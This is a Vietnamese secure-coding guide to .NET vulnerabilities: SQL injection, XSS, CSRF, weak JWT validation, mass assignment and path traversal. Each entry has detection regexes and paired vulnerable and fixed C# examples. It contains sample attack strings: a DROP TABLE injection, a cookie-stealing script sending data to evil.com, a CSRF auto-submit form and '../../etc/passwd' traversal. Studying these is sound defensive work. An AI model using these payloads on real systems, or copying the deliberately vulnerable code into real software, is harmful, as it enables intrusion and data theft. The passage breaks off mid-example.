# Domain 03: Bảo Mật Và Xác Thực (Security & Authentication)
# Domain 03: Security & Authentication - Common Vulnerabilities in .NET

**Lĩnh vực:** .NET Engineering - Security / Web Application
**Ngôn ngữ:** C#
**Tổng số patterns:** 14
**Cập nhật:** 2026-02-18

---

## Tổng Quan Domain

Bảo mật ứng dụng .NET là lĩnh vực có mật độ lỗi cao nhất và hậu quả nghiêm trọng nhất. Các lỗi bảo mật thường không gây lỗi runtime trong môi trường phát triển, nhưng mở ra cổng cho kẻ tấn công trong môi trường sản xuất. Nhiều lỗi bảo mật phổ biến trong .NET xuất phát từ việc dùng API không an toàn hoặc thiếu cấu hình bảo vệ mặc định.

```
PHÂN LOẠI MỨC ĐỘ NGHIÊM TRỌNG
================================
CRITICAL  - Cho phép tấn công trực tiếp: RCE, data breach, toàn bộ hệ thống bị kiểm soát
HIGH      - Cho phép leo quyền, bypass auth, đánh cắp dữ liệu quan trọng
MEDIUM    - Giảm bảo mật, tăng bề mặt tấn công, vi phạm compliance
LOW       - Code smell bảo mật, vi phạm best practice
```

---

## Pattern 01: SQL Injection Qua FromSqlRaw

### 1. Tên
**SQL Injection qua FromSqlRaw với String Interpolation**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** Injection Attack / Database Security

### 3. Mức Nghiêm Trọng
**CRITICAL** - Cho phép kẻ tấn công đọc, sửa, xóa toàn bộ database; có thể dẫn đến RCE

### 4. Vấn Đề

SQL Injection xảy ra khi dữ liệu người dùng được nhúng trực tiếp vào câu lệnh SQL mà không qua parameterization. Trong Entity Framework Core, `FromSqlRaw` với string interpolation (`$"..."`) là bẫy phổ biến vì cú pháp trông giống `FromSqlInterpolated` nhưng KHÔNG an toàn.

```
LUỒNG TẤN CÔNG SQL INJECTION
==============================

Attacker input:  "'; DROP TABLE Users; --"
                          │
                          ▼
FromSqlRaw($"SELECT * FROM Users WHERE Name = '{input}'")
                          │
                          ▼
SQL thực thi:  SELECT * FROM Users WHERE Name = '';
               DROP TABLE Users; --'
                          │
                          ▼
               ❌ TABLE USERS BỊ XÓA HOÀN TOÀN

FROMsqlraw vs FROMSQLINTERPOLATED
===================================
FromSqlRaw($"... {input} ...")         → NGUY HIỂM: Nối chuỗi thô
FromSqlInterpolated($"... {input} ...") → AN TOÀN: Tự động parameterize
FromSqlRaw("... {0} ...", input)       → AN TOÀN: Explicit parameter
```

### 5. Phát Hiện Trong Mã Nguồn

**Dấu hiệu nhận biết:**
- `FromSqlRaw` kết hợp với `$"..."` (string interpolation)
- `ExecuteSqlRaw` với tham số người dùng nối chuỗi trực tiếp
- String concatenation trong SQL query

**Regex patterns cho ripgrep:**

```bash
# Tìm FromSqlRaw với string interpolation (NGUY HIỂM)
rg "FromSqlRaw\s*\(\s*\$\"" --type cs

# Tìm ExecuteSqlRaw với string interpolation
rg "ExecuteSqlRaw\s*\(\s*\$\"" --type cs

# Tìm SQL nối chuỗi trực tiếp với biến
rg "FromSqlRaw\s*\(.*\+\s*\w+" --type cs

# Tìm tất cả FromSqlRaw để review thủ công
rg "FromSqlRaw|ExecuteSqlRaw" --type cs -n

# Tìm string.Format trong SQL context
rg "string\.Format\s*\(.*SELECT|INSERT|UPDATE|DELETE" --type cs -i
```

**Ví dụ output log khi bị khai thác:**
```
Microsoft.Data.SqlClient.SqlException: Incorrect syntax near '--'.
-- Hoặc không có lỗi nào (kẻ tấn công thành công âm thầm)
-- Kiểm tra slow query log: đột ngột có query lạ
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: String interpolation trong FromSqlRaw - SQL INJECTION!
public async Task<List<User>> SearchUsersAsync(string searchTerm)
{
    // Nếu searchTerm = "'; DROP TABLE Users; --"
    // SQL sẽ bị inject
    return await _context.Users
        .FromSqlRaw($"SELECT * FROM Users WHERE Name LIKE '%{searchTerm}%'")
        .ToListAsync();
}

// BAD: String concatenation
public async Task<User?> GetUserByEmailAsync(string email)
{
    var sql = "SELECT * FROM Users WHERE Email = '" + email + "'";
    return await _context.Users.FromSqlRaw(sql).FirstOrDefaultAsync();
}

// BAD: ExecuteSqlRaw với interpolation
public async Task DeleteUserAsync(string userId)
{
    await _context.Database.ExecuteSqlRawAsync(
        $"DELETE FROM Users WHERE Id = {userId}");
}
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: Dùng FromSqlInterpolated (tự động parameterize)
public async Task<List<User>> SearchUsersAsync(string searchTerm)
{
    // FromSqlInterpolated tự động convert thành parameterized query
    return await _context.Users
        .FromSqlInterpolated($"SELECT * FROM Users WHERE Name LIKE '%{searchTerm}%'")
        .ToListAsync();
}

// GOOD: Dùng FromSqlRaw với explicit parameters
public async Task<User?> GetUserByEmailAsync(string email)
{
    return await _context.Users
        .FromSqlRaw("SELECT * FROM Users WHERE Email = {0}", email)
        .FirstOrDefaultAsync();
}

// GOOD: Dùng LINQ (an toàn nhất - EF tự generate parameterized SQL)
public async Task<List<User>> SearchUsersLinqAsync(string searchTerm)
{
    return await _context.Users
        .Where(u => u.Name.Contains(searchTerm))
        .ToListAsync();
}

// GOOD: Dùng Dapper với parameterized query
public async Task<User?> GetUserDapperAsync(string email)
{
    using var connection = _connectionFactory.CreateConnection();
    return await connection.QueryFirstOrDefaultAsync<User>(
        "SELECT * FROM Users WHERE Email = @Email",
        new { Email = email }); // Named parameter - an toàn
}

// GOOD: ExecuteSqlRaw an toàn
public async Task DeleteUserAsync(int userId)
{
    // Dùng SqlParameter thay vì interpolation
    await _context.Database.ExecuteSqlRawAsync(
        "DELETE FROM Users WHERE Id = {0}", userId);
}
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Không bao giờ dùng `FromSqlRaw` với string interpolation (`$"..."`)
- [ ] Ưu tiên LINQ queries thay vì raw SQL
- [ ] Nếu cần raw SQL: dùng `FromSqlInterpolated` hoặc named parameters
- [ ] Với Dapper: luôn dùng `@ParameterName` syntax
- [ ] Enable SQL Server Audit để phát hiện bất thường
- [ ] Áp dụng principle of least privilege cho DB account

**Roslyn Analyzer Rules:**
```xml
<!-- Cài package: SecurityCodeScan.VS2019 -->
<!-- Trong .editorconfig -->
dotnet_diagnostic.SCS0002.severity = error  <!-- SQL Injection via EF -->
dotnet_diagnostic.SCS0026.severity = error  <!-- SQL Injection via Dapper -->

<!-- Cài package: Puma.Security.Rules -->
dotnet_diagnostic.SEC0001.severity = error  <!-- SQL Injection -->
```

---

## Pattern 02: XSS Qua Html.Raw Trong Razor

### 1. Tên
**Cross-Site Scripting (XSS) qua Html.Raw trong Razor Views**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** XSS / Output Encoding

### 3. Mức Nghiêm Trọng
**CRITICAL** - Cho phép kẻ tấn công chạy JavaScript tùy ý trong trình duyệt của nạn nhân, đánh cắp cookie/session

### 4. Vấn Đề

Razor Views tự động HTML-encode output để ngăn XSS. Tuy nhiên, `Html.Raw()` bypass cơ chế bảo vệ này. Khi dữ liệu người dùng được render qua `Html.Raw()`, kẻ tấn công có thể inject JavaScript thực thi trong trình duyệt nạn nhân.

```
LUỒNG TẤN CÔNG XSS
====================

Attacker nhập:  <script>document.location='http://evil.com/steal?c='+document.cookie</script>
                          │
                          ▼
Database lưu: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
                          │
                          ▼
Razor render: @Html.Raw(Model.UserComment)  ← Render thô, không encode
                          │
                          ▼
Browser thực thi script → Cookie nạn nhân bị gửi đến evil.com

AUTO-ENCODE vs Html.Raw
========================
@Model.Name        → An toàn: render thành &lt;script&gt;
@Html.Raw(Model.Name) → NGUY HIỂM: render thành <script>
```

### 5. Phát Hiện Trong Mã Nguồn

**Dấu hiệu nhận biết:**
- `Html.Raw(...)` với dữ liệu từ database hoặc user input
- `@(new HtmlString(...))` với dữ liệu không tin cậy
- JavaScript inline sử dụng dữ liệu server-side không encode

**Regex patterns cho ripgrep:**

```bash
# Tìm tất cả Html.Raw usage
rg "Html\.Raw\s*\(" --type cshtml

# Tìm HtmlString constructor
rg "new\s+HtmlString\s*\(" --type cs --type cshtml

# Tìm Html.Raw với biến (cần review từng trường hợp)
rg "Html\.Raw\s*\(\s*\w" --type cshtml -n

# Tìm JavaScript inline với server data (nguy hiểm)
rg "var\s+\w+\s*=\s*@" --type cshtml

# Tìm trong controller - trả về HTML content trực tiếp
rg "Content\s*\(.*\"text/html\"" --type cs
```

### 6. Giải Pháp

**Ví dụ SAI:**

```html
<!-- BAD: Html.Raw với dữ liệu từ user - XSS! -->
@* Trong Razor View *@
<div class="comment">
    @Html.Raw(Model.UserComment)  @* NGUY HIỂM *@
</div>

<!-- BAD: Html.Raw với dữ liệu từ DB -->
<div>@Html.Raw(Model.ProductDescription)</div>

<!-- BAD: JavaScript inline với server data không encode -->
<script>
    var userName = "@Model.UserName";  // Inject: "; alert('XSS'); var x = "
    var config = @Html.Raw(Model.JsonConfig);  // NGUY HIỂM
</script>
```

```csharp
// BAD: Controller trả về HTML không encode
[HttpGet("comment/{id}")]
public IActionResult GetComment(int id)
{
    var comment = _db.Comments.Find(id);
    return Content(comment.Text, "text/html"); // Render thô
}
```

**Ví dụ ĐÚNG:**

```html
<!-- GOOD: Razor tự động encode - AN TOÀN -->
<div class="comment">
    @Model.UserComment  @* Razor tự encode HTML entities *@
</div>

<!-- GOOD: Nếu cần render HTML từ trusted source (CMS nội bộ) -->
@* Sanitize trước khi dùng Html.Raw *@
<div>@Html.Raw(Model.SanitizedDescription)</div>

<!-- GOOD: JavaScript - dùng JSON encode cho server data -->
<script>
    // Dùng JSON.parse với properly encoded JSON
    var config = JSON.parse('@Html.Raw(Json.Serialize(Model.SafeConfig))');

    // Hoặc dùng data attribute (an toàn hơn)
</script>
<div id="app" data-user="@Model.UserName"></div>
<script>
    var userName = document.getElementById('app').dataset.user;
</script>
```

```csharp
// GOOD: Sanitize HTML content với HtmlSanitizer library
using Ganss.Xss;

public class ContentService
{
    private readonly HtmlSanitizer _sanitizer;

    public ContentService()
    {
        _sanitizer = new HtmlSanitizer();
        // Chỉ cho phép các tag an toàn
        _sanitizer.AllowedTags.Clear();
        _sanitizer.AllowedTags.Add("p");
        _sanitizer.AllowedTags.Add("b");
        _sanitizer.AllowedTags.Add("i");
        _sanitizer.AllowedTags.Add("br");
    }

    public string SanitizeUserContent(string rawHtml)
    {
        return _sanitizer.Sanitize(rawHtml);
    }
}

// GOOD: Model với sanitized property
public class ArticleViewModel
{
    public string Title { get; set; } = string.Empty;

    // Không bao giờ dùng Html.Raw với RawContent
    private string _rawContent = string.Empty;

    // Expose SanitizedContent cho View
    public IHtmlContent SafeContent
    {
        get
        {
            var sanitized = _sanitizer.Sanitize(_rawContent);
            return new HtmlString(sanitized);
        }
    }
}

// GOOD: Response encoding trong Controller
[HttpGet("comment/{id}")]
public IActionResult GetComment(int id)
{
    var comment = _db.Comments.Find(id);
    // Trả về plain text, không phải HTML
    return Content(WebUtility.HtmlEncode(comment!.Text), "text/plain");
}
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Không bao giờ dùng `Html.Raw()` với dữ liệu người dùng
- [ ] Nếu cần render HTML rich text: sanitize với `HtmlSanitizer` trước
- [ ] JavaScript inline: dùng `data-*` attributes hoặc `Json.Serialize`
- [ ] Enable Content Security Policy (CSP) header
- [ ] Implement cookie `HttpOnly` và `Secure` flags

**Roslyn Analyzer Rules:**
```xml
<!-- Trong .editorconfig -->
dotnet_diagnostic.SCS0029.severity = error  <!-- XSS via Html.Raw -->

<!-- Content Security Policy trong Program.cs -->
```
```csharp
// Program.cs - Thêm CSP header
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy",
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
    context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
    await next();
});
```

---

## Pattern 03: CSRF Token Thiếu

### 1. Tên
**Cross-Site Request Forgery (CSRF) do Thiếu ValidateAntiForgeryToken**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** CSRF / State-Changing Requests

### 3. Mức Nghiêm Trọng
**CRITICAL** - Cho phép website độc hại thực hiện hành động thay mặt người dùng đang đăng nhập

### 4. Vấn Đề

CSRF (Cross-Site Request Forgery) xảy ra khi kẻ tấn công lừa browser của nạn nhân gửi request đến ứng dụng với cookie session hợp lệ. Trong ASP.NET Core, MVC form submissions cần Anti-Forgery Token để xác minh request xuất phát từ trang web hợp lệ.

```
LUỒNG TẤN CÔNG CSRF
=====================

1. Nạn nhân đang đăng nhập tại bank.com (có session cookie)
2. Nạn nhân truy cập evil.com (trang độc hại)
3. evil.com có hidden form:

   <form action="https://bank.com/transfer" method="POST">
     <input name="amount" value="10000">
     <input name="to" value="attacker-account">
   </form>
   <script>document.forms[0].submit()</script>

4. Browser tự động gửi cookie bank.com với request
5. Server không có CSRF check → Chuyển tiền thành công!

BẢO VỆ VỚI ANTI-FORGERY TOKEN
================================
Server gửi token bí mật trong form:
  <input name="__RequestVerificationToken" value="xyz123...">

evil.com KHÔNG THỂ biết token này → Request bị từ chối
```

### 5. Phát Hiện Trong Mã Nguồn

**Dấu hiệu nhận biết:**
- POST/PUT/DELETE actions thiếu `[ValidateAntiForgeryToken]`
- Razor forms không có `@Html.AntiForgeryToken()` hoặc `asp-antiforgery`
- API endpoints nhận cookie authentication mà không validate CSRF

**Regex patterns cho ripgrep:**

```bash
# Tìm POST actions thiếu ValidateAntiForgeryToken
rg "\[HttpPost\]" --type cs -A 5 | grep -v "ValidateAntiForgeryToken"

# Tìm tất cả HttpPost/HttpPut/HttpDelete để review
rg "\[Http(Post|Put|Delete|Patch)\]" --type cs -n

# Tìm ValidateAntiForgeryToken để kiểm tra coverage
rg "ValidateAntiForgeryToken|IgnoreAntiforgeryToken" --type cs -n

# Tìm form trong Razor không có antiforgery
rg "<form\s+method=['\"]post['\"]" --type cshtml

# Tìm Ajax POST mà không gửi token
rg "\.post\s*\(|method:\s*['\"]POST['\"]" --type js --type ts
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: POST action không có CSRF protection
[HttpPost]
public async Task<IActionResult> TransferMoney(TransferRequest request)
{
    // CSRF: Bất kỳ website nào cũng có thể trigger action này!
    await _bankService.TransferAsync(request.FromAccount,
        request.ToAccount, request.Amount);
    return Ok();
}

// BAD: Controller không có AutoValidateAntiforgeryToken
[Controller]
public class AccountController : Controller
{
    [HttpPost]
    public IActionResult UpdateProfile(ProfileModel model) { ... }

    [HttpPost]
    public IActionResult ChangePassword(PasswordModel model) { ... }
}
```

```html
<!-- BAD: Form không có antiforgery token -->
<form method="post" action="/account/update">
    <input type="text" name="Name" />
    <button type="submit">Update</button>
</form>
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: Từng action có [ValidateAntiForgeryToken]
[HttpPost]
[ValidateAntiForgeryToken]
public async Task<IActionResult> TransferMoney(TransferRequest request)
{
    await _bankService.TransferAsync(request.FromAccount,
        request.ToAccount, request.Amount);
    return Ok();
}

// GOOD: Toàn bộ controller dùng AutoValidateAntiforgeryToken
[AutoValidateAntiforgeryToken]
public class AccountController : Controller
{
    [HttpPost]
    public IActionResult UpdateProfile(ProfileModel model) { ... }

    [HttpPost]
    public IActionResult ChangePassword(PasswordModel model) { ... }

    // Nếu một action không cần (ví dụ: webhook), dùng IgnoreAntiforgeryToken
    [HttpPost]
    [IgnoreAntiforgeryToken]
    public IActionResult Webhook(WebhookPayload payload) { ... }
}

// GOOD: Global filter cho toàn bộ ứng dụng (MVC)
// Program.cs
builder.Services.AddControllersWithViews(options =>
{
    options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());
});

// GOOD: API với JWT (không dùng cookie auth) - dùng SameSite cookie
// Hoặc custom CSRF header
[HttpPost]
public async Task<IActionResult> ApiAction(ApiRequest request)
{
    // JWT Bearer token trong Authorization header → không cần CSRF
    // vì cross-origin requests không tự gửi Authorization header
    return Ok();
}
```

```html
<!-- GOOD: Razor form với Tag Helper (tự động thêm token) -->
<form method="post" asp-controller="Account" asp-action="Update">
    @* asp-antiforgery="true" là mặc định cho form POST *@
    <input type="text" asp-for="Name" />
    <button type="submit">Update</button>
</form>

<!-- GOOD: Thủ công nếu không dùng Tag Helper -->
<form method="post" action="/account/update">
    @Html.AntiForgeryToken()
    <input type="text" name="Name" />
    <button type="submit">Update</button>
</form>
```

```javascript
// GOOD: JavaScript/AJAX gửi CSRF token
// Đọc token từ meta tag
const token = document.querySelector('meta[name="__RequestVerificationToken"]').content;

fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'RequestVerificationToken': token  // Gửi token trong header
    },
    body: JSON.stringify({ amount: 100 })
});
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Thêm `AutoValidateAntiforgeryToken` global filter hoặc trên từng controller
- [ ] Mọi Razor form POST đều có `@Html.AntiForgeryToken()` (Tag Helper tự động)
- [ ] AJAX requests gửi token trong header `RequestVerificationToken`
- [ ] API dùng JWT Bearer (không dùng cookie) không cần CSRF token
- [ ] Implement `SameSite=Strict` hoặc `SameSite=Lax` cho session cookies

**Roslyn Analyzer Rules:**
```xml
dotnet_diagnostic.SCS0016.severity = error  <!-- Missing AntiForgeryToken -->
```

---

## Pattern 04: JWT Validation Thiếu

### 1. Tên
**JWT Validation Yếu qua TokenValidationParameters Không Đầy Đủ**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** Authentication / Token Validation

### 3. Mức Nghiêm Trọng
**CRITICAL** - Cho phép kẻ tấn công tạo JWT giả, bypass authentication hoàn toàn

### 4. Vấn Đề

JWT (JSON Web Token) an toàn CHỈ khi được validate đúng cách. Thiếu validation một phần của JWT cho phép kẻ tấn công forge token hoặc sử dụng token đã hết hạn/bị thu hồi.

```
CẤU TRÚC JWT VÀ CÁC ĐIỂM VALIDATE
=====================================

JWT = Header.Payload.Signature
       │        │        │
       │        │        └── Verify bằng secret/public key
       │        │             ValidateIssuerSigningKey = true
       │        │
       │        ├── ValidateIssuer: Kiểm tra "iss" claim
       │        ├── ValidateAudience: Kiểm tra "aud" claim
       │        ├── ValidateLifetime: Kiểm tra "exp" (hết hạn)
       │        └── ClockSkew: Dung sai thời gian
       │
       └── alg: Kiểm tra thuật toán (tránh alg=none attack)

TẤN CÔNG "alg=none"
====================
Kẻ tấn công thay đổi header: {"alg": "none"}
Xóa phần signature
Nếu server không validate algorithm → Token được chấp nhận!
```

### 5. Phát Hiện Trong Mã Nguồn

**Dấu hiệu nhận biết:**
- `ValidateIssuerSigningKey = false`
- `ValidateLifetime = false`
- `ValidateIssuer = false` và `ValidateAudience = false` cùng lúc
- `ClockSkew = TimeSpan.MaxValue`
- Thiếu `ValidAlgorithms` restriction

**Regex patterns cho ripgrep:**

```bash
# Tìm TokenValidationParameters với validate = false
rg "Validate\w+\s*=\s*false" --type cs -n

# Tìm ClockSkew lớn bất thường
rg "ClockSkew\s*=\s*TimeSpan\.MaxValue|ClockSkew\s*=\s*TimeSpan\.FromHours\([5-9]|[1-9][0-9]" --type cs

# Tìm JwtSecurityTokenHandler
rg "JwtSecurityTokenHandler|TokenValidationParameters" --type cs -n

# Tìm symmetric key ngắn (yếu)
rg "new\s+SymmetricSecurityKey\s*\(\s*Encoding\.\w+\.GetBytes\s*\(" --type cs -A 2

# Tìm hardcoded JWT secret
rg "\"[A-Za-z0-9+/]{20,}\"" --type cs | grep -i "secret\|key\|jwt"
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: Nhiều validation bị tắt
var tokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuerSigningKey = false,  // NGUY HIỂM: Không verify chữ ký
    ValidateIssuer = false,            // Bất kỳ issuer nào đều được chấp nhận
    ValidateAudience = false,          // Bất kỳ audience nào đều được chấp nhận
    ValidateLifetime = false,          // Token hết hạn vẫn được chấp nhận!
    ClockSkew = TimeSpan.MaxValue      // NGUY HIỂM: Dung sai thời gian vô hạn
};

// BAD: Symmetric key quá ngắn (dễ brute-force)
var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes("secret123"));
// 9 bytes = 72 bits, có thể bị brute-force

// BAD: Không restrict thuật toán (dễ bị alg=none attack)
services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            // Thiếu ValidAlgorithms - dễ bị "alg:none" attack
            IssuerSigningKey = new SymmetricSecurityKey(...)
        };
    });
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: Đầy đủ validation parameters
// Program.cs hoặc Startup.cs
var jwtKey = builder.Configuration["Jwt:Key"]
    ?? throw new InvalidOperationException("JWT key not configured");

// Đảm bảo key đủ dài (ít nhất 32 bytes = 256 bits cho HMAC-SHA256)
if (Encoding.UTF8.GetBytes(jwtKey).Length < 32)
    throw new InvalidOperationException("JWT key must be at least 32 characters");

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            // Bắt buộc validate chữ ký
            ValidateIssuerSigningKey = true,
            IssuerSigningKey = new SymmetricSecurityKey(
                Encoding.UTF8.GetBytes(jwtKey)),

            // Validate Issuer và Audience
            ValidateIssuer = true,
            ValidIssuer = builder.Configuration["Jwt:Issuer"],

            ValidateAudience = true,
            ValidAudience = builder.Configuration["Jwt:Audience"],

            // Validate thời gian hết hạn
            ValidateLifetime = true,
            ClockSkew = TimeSpan.FromMinutes(5), // Chỉ 5 phút dung sai

            // Restrict thuật toán (chống alg=none attack)
            ValidAlgorithms = new[] { SecurityAlgorithms.HmacSha256 },

            // Require expiry claim
            RequireExpirationTime = true
        };

        // Thêm event handlers để log và custom validation
        options.Events = new JwtBearerEvents
        {
            OnAuthenticationFailed = context =>
            {
                var logger = context.HttpContext.RequestServices
                    .GetRequiredService<ILogger<Program>>();
                logger.LogWarning("JWT authentication failed: {Error}",
                    context.Exception.Message);
                return Task.CompletedTask;
            },
            OnTokenValidated = context =>
            {
                // Custom validation: kiểm tra token có bị revoke không
                var tokenRevocationService = context.HttpContext.RequestServices
                    .GetRequiredService<ITokenRevocationService>();
                var token = context.SecurityToken as JwtSecurityToken;
                if (token != null && tokenRevocationService.IsRevoked(token.Id))
                {
                    context.Fail("Token has been revoked");
                }
                return Task.CompletedTask;
            }
        };
    });

// GOOD: Token generation an toàn
public class JwtTokenService
{
    private readonly IConfiguration _config;

    public string GenerateToken(User user)
    {
        var key = new SymmetricSecurityKey(
            Encoding.UTF8.GetBytes(_config["Jwt:Key"]!));

        var claims = new[]
        {
            new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
            new Claim(ClaimTypes.Email, user.Email),
            new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()), // Unique token ID
            new Claim(JwtRegisteredClaimNames.Iat,
                DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString(),
                ClaimValueTypes.Integer64)
        };

        var token = new JwtSecurityToken(
            issuer: _config["Jwt:Issuer"],
            audience: _config["Jwt:Audience"],
            claims: claims,
            expires: DateTime.UtcNow.AddHours(1), // Thời gian sống ngắn
            signingCredentials: new SigningCredentials(key,
                SecurityAlgorithms.HmacSha256)
        );

        return new JwtSecurityTokenHandler().WriteToken(token);
    }
}
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] `ValidateIssuerSigningKey = true` luôn luôn
- [ ] `ValidateLifetime = true` và `ClockSkew` nhỏ (5-10 phút)
- [ ] `ValidateIssuer = true` và `ValidateAudience = true`
- [ ] Restrict `ValidAlgorithms` (không để mặc định)
- [ ] JWT key ít nhất 256 bits (32 bytes)
- [ ] JWT key từ environment variable, không hardcode
- [ ] Implement token revocation cho logout

**Roslyn Analyzer Rules:**
```xml
dotnet_diagnostic.SCS0005.severity = error   <!-- Weak random number -->
<!-- Dùng SonarAnalyzer.CSharp -->
dotnet_diagnostic.S2068.severity = error     <!-- Hard-coded credentials -->
dotnet_diagnostic.S5659.severity = error     <!-- JWT without verification -->
```

---

## Pattern 05: Mass Assignment

### 1. Tên
**Mass Assignment - Bind Trực Tiếp Request vào Entity**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** Over-Posting / Data Integrity

### 3. Mức Nghiêm Trọng
**HIGH** - Kẻ tấn công có thể ghi đè các field nhạy cảm như `IsAdmin`, `Role`, `Balance`

### 4. Vấn Đề

Mass Assignment xảy ra khi model binding tự động map tất cả request fields vào entity object. Kẻ tấn công có thể gửi thêm các field không có trong form nhưng tồn tại trong entity để leo quyền.

```
TẤN CÔNG MASS ASSIGNMENT
==========================

Entity thực tế:
  { Id: 1, Name: "John", Email: "j@j.com", IsAdmin: false, Role: "user" }

Form hiển thị cho user:
  { Name: "...", Email: "..." }

Kẻ tấn công gửi:
  { Name: "John", Email: "j@j.com", IsAdmin: true, Role: "admin" }

Nếu bind trực tiếp vào entity:
  entity.IsAdmin = true  ← BẢNG THĂNG CẤP BẤT HỢP PHÁP!
  entity.Role = "admin"
```

### 5. Phát Hiện Trong Mã Nguồn

**Regex patterns cho ripgrep:**

```bash
# Tìm direct bind vào DbContext entity
rg "_context\.\w+\.Update\(\s*model\b|_db\.\w+\.Update\(\s*model\b" --type cs

# Tìm AutoMapper map trực tiếp từ request sang entity
rg "Map<\w+Entity>|Map<\w+Model>" --type cs -n

# Tìm [Bind] attribute (cần review whitelist)
rg "\[Bind\(" --type cs -n

# Tìm pattern EntityEntry.CurrentValues.SetValues với request object
rg "SetValues\s*\(\s*(request|model|dto|input)" --type cs -i
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: Bind trực tiếp request vào entity
[HttpPut("{id}")]
public async Task<IActionResult> UpdateUser(int id, UserEntity user)
{
    // user.IsAdmin, user.Role có thể bị kẻ tấn công set!
    _context.Users.Update(user);
    await _context.SaveChangesAsync();
    return Ok();
}

// BAD: AutoMapper map toàn bộ request -> entity
[HttpPost]
public async Task<IActionResult> CreateUser(CreateUserRequest request)
{
    var user = _mapper.Map<UserEntity>(request); // Map tất cả fields!
    _context.Users.Add(user);
    await _context.SaveChangesAsync();
    return Ok();
}
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: Dùng DTO với chỉ các field được phép
public record UpdateUserRequest(string Name, string Email); // Không có IsAdmin, Role

[HttpPut("{id}")]
public async Task<IActionResult> UpdateUser(int id, UpdateUserRequest request)
{
    var user = await _context.Users.FindAsync(id);
    if (user == null) return NotFound();

    // Chỉ update các field được phép
    user.Name = request.Name;
    user.Email = request.Email;
    // IsAdmin và Role không thể bị thay đổi qua endpoint này

    await _context.SaveChangesAsync();
    return Ok();
}

// GOOD: AutoMapper với explicit mapping (whitelist)
public class UserMappingProfile : Profile
{
    public UserMappingProfile()
    {
        CreateMap<CreateUserRequest, UserEntity>()
            .ForMember(dest => dest.IsAdmin, opt => opt.Ignore())  // Bỏ qua
            .ForMember(dest => dest.Role, opt => opt.UseValue(UserRole.User)) // Default
            .ForMember(dest => dest.CreatedAt, opt => opt.MapFrom(_ => DateTime.UtcNow));
    }
}
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Luôn dùng DTOs (Request/Response models) riêng biệt, không dùng Entity trực tiếp
- [ ] AutoMapper: explicit map hoặc `ForMember(..., opt => opt.Ignore())`
- [ ] Các field nhạy cảm (`IsAdmin`, `Role`, `Balance`) chỉ update qua admin endpoints riêng
- [ ] `[Bind("FieldA,FieldB")]` nếu phải dùng entity trực tiếp (whitelist approach)

**Roslyn Analyzer Rules:**
```xml
dotnet_diagnostic.SCS0012.severity = warning  <!-- Controller với entity binding -->
```

---

## Pattern 06: Path Traversal

### 1. Tên
**Path Traversal qua Path.Combine với User Input Chứa ".."**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** Path Traversal / File System Security

### 3. Mức Nghiêm Trọng
**CRITICAL** - Cho phép kẻ tấn công đọc/ghi file ngoài thư mục được phép (appsettings.json, private keys, /etc/passwd)

### 4. Vấn Đề

`Path.Combine` KHÔNG sanitize `..` sequences. Nếu user input chứa `../`, kẻ tấn công có thể thoát khỏi thư mục được phép và truy cập file nhạy cảm.

```
TẤN CÔNG PATH TRAVERSAL
==========================

baseDir = "C:\App\uploads\"
filename từ user = "..\..\appsettings.json"

Path.Combine(baseDir, filename)
= "C:\App\uploads\..\..\appsettings.json"
= "C:\appsettings.json"   ← File bên ngoài uploads!

Trên Linux:
baseDir = "/app/uploads/"
filename = "../../../../etc/passwd"
Path.Combine(baseDir, filename) = "/etc/passwd"  ← Đọc được!
```

### 5. Phát Hiện Trong Mã Nguồn

**Regex patterns cho ripgrep:**

```bash
# Tìm Path.Combine với request/user input
rg "Path\.Combine\s*\(.*(?:request|Input|param|query|filename|name)" --type cs -i

# Tìm File.ReadAllText/WriteAllText với dynamic path
rg "File\.(Read|Write|Delete|Open)\w*\s*\(\s*(?!\")" --type cs -n

# Tìm path concatenation với user data
rg "baseDir\s*\+|uploadPath\s*\+|filePath\s*\+" --type cs
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: Path.Combine với user input không validate
[HttpGet("download")]
public IActionResult DownloadFile(string filename)
{
    var baseDir = Path.Combine(_env.WebRootPath, "uploads");
    var filePath = Path.Combine(baseDir, filename); // filename = "../../appsettings.json"
    return PhysicalFile(filePath, "application/octet-stream");
}
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: Validate path không thoát khỏi base directory
[HttpGet("download")]
public IActionResult DownloadFile(string filename)
{
    // 1. Lấy chỉ tên file, bỏ path components
    var safeFileName = Path.GetFileName(filename);

    // 2. Kiểm tra ký tự không hợp lệ
    if (string.IsNullOrWhiteSpace(safeFileName) ||
